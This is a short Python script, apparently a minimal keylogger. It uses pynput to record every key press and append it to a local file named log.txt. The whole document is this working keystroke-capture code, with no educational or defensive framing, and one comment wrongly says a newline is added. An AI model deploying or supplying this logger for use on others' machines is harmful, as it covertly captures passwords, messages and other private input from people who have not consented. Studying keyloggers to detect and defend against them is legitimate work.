from pynput.keyboard import Listener

# Function to write the pressed key to the file
def writetofile(key):
    letter = str(key)
    letter = letter.replace("'" , "")

    with open("log.txt", 'a') as f:
        # Convert the key to a string and write it to the file
        f.write(letter)  # Add a newline for readability

# Start the listener
with Listener(on_press=writetofile) as l:
    l.join()
